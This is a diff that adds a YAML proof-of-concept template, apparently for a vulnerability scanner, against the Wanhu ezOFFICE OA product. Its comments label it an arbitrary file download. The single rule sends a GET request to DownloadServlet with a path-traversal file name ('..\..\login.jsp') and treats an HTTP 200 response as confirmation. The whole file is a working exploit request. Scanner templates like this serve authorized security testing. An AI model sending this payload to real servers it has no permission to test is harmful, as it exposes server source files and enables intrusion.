@@ -1,0 +1,19 @@
+name: poc-yaml-wanhuezoffice-renyixiazai
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: >-
+        /defaultroot/DownloadServlet?modeType=2&path=html&FileName=..\..\login.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2
+      follow_redirects: false
+      headers:
+        User-Agent: >-
+          Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/114.0.0.0 Safari/537.36
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: hy
+#app.name="万户 Ezoffice OA"
+#万户zoffice任意文件下载
